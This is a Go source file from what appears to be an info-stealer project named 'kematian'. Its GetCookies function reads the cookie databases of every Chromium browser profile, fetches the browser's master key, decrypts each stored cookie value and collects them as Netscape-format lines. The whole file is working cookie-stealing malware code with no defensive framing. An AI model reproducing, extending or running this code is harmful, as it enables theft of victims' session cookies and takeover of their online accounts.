package cookiesChromium

import (
	"database/sql"

	"kdot/kematian/browsers/structs"
	"kdot/kematian/decryption"
)

func GetCookies(browsersList []structs.Browser) []structs.CookiesOutput {
	var cookies []structs.CookiesOutput
	for _, browser := range browsersList {
		if !browser.IsChromium {
			continue
		}
		var cookiesFound = ""
		for _, profile := range browser.Profiles {
			path := profile.Cookies

			master_key := decryption.GetMasterKey(browser.LocalState)
			if len(master_key) == 0 {
				continue
			}
			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT host_key, path, is_httponly, expires_utc, name, encrypted_value FROM cookies")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var host_key string
				var path string
				var is_httponly string
				var expires_utc string
				var name string
				var encrypted_value []byte
				row.Scan(&host_key, &path, &is_httponly, &expires_utc, &name, &encrypted_value)
				decrypted, err := decryption.DecryptPassword(encrypted_value, master_key)
				if err != nil {
					decrypted = string(encrypted_value)
				}
				httpfrfr := "TRUE"
				if is_httponly == "0" {
					httpfrfr = "FALSE"
				}
				tf_other := "TRUE"
				if host_key[0] == '.' {
					tf_other = "FALSE"
				}
				cookiesFound = cookiesFound + host_key + "\t" + tf_other + "\t" + path + "\t" + httpfrfr + "\t" + expires_utc + "\t" + name + "\t" + decrypted + "\n"
			}
		}
		cookies = append(cookies, structs.CookiesOutput{BrowserName: browser.ProfilePath, Cookies: cookiesFound})
	}
	return cookies
}
